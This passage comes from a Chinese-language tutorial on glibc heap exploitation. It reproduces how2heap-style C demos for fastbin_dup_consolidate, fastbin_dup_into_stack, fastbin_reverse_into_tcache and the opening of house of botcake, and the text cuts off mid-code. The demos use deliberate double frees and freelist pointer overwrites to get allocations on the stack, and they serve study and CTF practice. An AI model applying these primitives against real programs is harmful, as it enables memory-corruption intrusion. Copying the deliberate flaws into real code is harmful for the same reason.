chunks）及其相邻的块，将它们放入未排序的块中，并在可能的情况下与顶部块合并。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">截至 glibc 版本 2.35，该函数仅在以下五个地方被调用：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">_int_malloc：当正在分配一个大块时（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965）</span></span><br><span class="line"><span class="comment">_int_malloc：如果没有找到块并且顶部块太小（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394）</span></span><br><span class="line"><span class="comment">_int_free：如果块大小 &gt;= FASTBIN_CONSOLIDATION_THRESHOLD（65536）（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674）</span></span><br><span class="line"><span class="comment">mtrim：始终（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041）</span></span><br><span class="line"><span class="comment">__libc_mallopt：始终（https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463）</span></span><br><span class="line"><span class="comment">我们将针对第一个地方，因此我们需要分配一个不属于小块（small bin）的块（因为我们试图进入此检查的 &quot;else&quot; 分支： https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901）。这意味着我们的块大小需要 &gt;= 0x400（因此是大块）。值得注意的是，最大的 tcache 大小块是 0x410，所以如果我们的块大小在 [0x400, 0x410] 范围内，我们可以利用双重释放来控制一个 tcache 大小块。.   </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique will make use of malloc_consolidate and a double free to gain a duplication in the tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Lets prepare to fill up the tcache in order to force fastbin usage...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		<span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;Now freeing p1 will add it to the fastbin.\n\n&quot;</span>);</span><br><span class="line">  	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a tcache-sized chunk with chunk size 0x410 &quot;</span>);</span><br><span class="line">  	<span class="type">void</span>* p2 = <span class="built_in">malloc</span>(CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p2=%p.\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nFirst, malloc_consolidate will merge the fast chunk p1 with top.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, p2 is allocated from top since there is no free chunk bigger (or equal) than it. Thus, p1 = p2.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert(p1 == p2);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;We will double free p1, which now points to the 0x410 chunk we just allocated (p2).\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1); <span class="comment">// vulnerability (double free)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It is now in the tcache (or merged with top if we had initially chosen a chunk size &gt; 0x410).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So p1 is double freed, and p2 hasn&#x27;t been freed although it now points to a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will request 0x400 bytes. This will give us the 0x410 chunk that&#x27;s currently in\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the tcache bin. p2 and p1 will still be pointing to it.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *p3 = <span class="built_in">malloc</span>(CHUNK_SIZE);</span><br><span class="line"></span><br><span class="line">	assert(p3 == p2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We now have two pointers (p2 and p3) that haven&#x27;t been directly freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;and both point to the same tcache sized chunk. p2=%p p3=%p\n&quot;</span>, p2, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We have achieved duplication!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Note: This duplication would have also worked with a larger chunk size, the chunks would\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;have behaved the same, just being taken from the top instead of from the tcache bin.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is pretty cool because it is usually difficult to duplicate large sized chunks\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;because they are resistant to direct double free&#x27;s due to their PREV_INUSE check.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以通过double free(一个在bins中，一个在其他的大的chunk中)来实现任意地址写</p>
<ul>
<li>申请7个chunk，再申请1个 chunk 名 p1</li>
<li>释放掉前7个chunk来填满tcache，再释放p1，此时它会进入fastbin中</li>
<li>申请一个largebin_chunk，申请大小为0x400那样得到的chunk为0x410(在tcache管理范围内)，malloc()此时会调用consilidate()函数合并所有的fastbin，p1就会被用在新申请的largebin_chunk的头部得到p2</li>
<li>再次free(p1)tcache中就会多一个chunk(0x410)，在将它申请出来得到p3</li>
<li>最终p2&#x3D;p3也就再次实现了两个可控的指针指向同一个chunk</li>
</ul>
<h3 id="相关技巧-1"><a href="#相关技巧-1" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-1"><a href="#利用效果-1" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>效果：通过 double free 来实现分配地址到栈上</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking calloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want calloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that calloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th calloc(1,8): %p\n&quot;</span>, p);</span><br><span class="line">	assert(p == <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line">	<span class="comment">// assert((long)__builtin_return_address(0) == *(long *)p);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出，UAF等</p>
<h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
</ul>
<h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>这个是fastbin_dup的扩展，基本一样：</p>
<ul>
<li>首先申请7个chunk，再申请同样3大小的chunk a b c</li>
<li>填满tcache，再free a  b a 即可在fastbin中形成a-&gt;b&lt;-a</li>
<li>申请出a b 修改 a 的fd指针为target - 0x10，并伪造target处的size</li>
<li>最后target就会出现在fastbin链表中，申请出即可</li>
</ul>
<h3 id="相关技巧-2"><a href="#相关技巧-2" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-2"><a href="#利用效果-2" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;下一个分配会触发栈被覆盖。tcache 为空，但 fastbin 不是，因此下一个分配来自 fastbin。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;同时，fastbin 中使用了 7 个块来补充 tcache。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;这 7 个块以逆序复制到 tcache 中，因此我们目标的栈地址\n&quot;</span></span><br><span class="line">    <span class="string">&quot;最终成为 tcache 中的第一个块。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;它包含指向列表中下一个块的指针，这就是为什么一个堆指针会被写入栈中的原因。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;之前我们提到，如果我们释放少于 6 个额外的 fastbin 指针，攻击仍然会奏效，但前提是\n&quot;</span></span><br><span class="line">    <span class="string">&quot;栈上的值为零。这是因为栈上的值被视为链表中的下一个指针，\n&quot;</span></span><br><span class="line">    <span class="string">&quot;如果它不是有效指针或空指针，则会触发崩溃。\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;我们在栈上的数组内容现在如下所示：\n\n&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
</ul>
<h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>申请了14个chunk，free掉7个填满tcache</li>
<li>free(victim)，victim是我们要修改的chunk</li>
<li>再free掉6个chunk填满fastbin，</li>
<li>修改victim的fd指针，指向target</li>
<li>清空tcache,此时申请chunk会从fastbin中取出，同时将fastbin中剩余的chunk<strong>逆序放入</strong>tcache中，我们第一个free的chunk(即victim)的fd(即栈地址)成为了tcache中的首个chunk，<strong>实现向target的fd,bk写入堆地址</strong></li>
<li>最后申请一次就可以直接申请出这个target伪造的chunk</li>
</ul>
<p>**注意：**若栈地址上的内容都为零，在fastbin中放入vicitm即可（无需再放6个）</p>
<h3 id="相关技巧-3"><a href="#相关技巧-3" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-3"><a href="#利用效果-3" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址写入一个堆地址，任意地址分配</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>效果：任意地址分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * 就是2.29新引入的key机制，检查tcache_double</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span 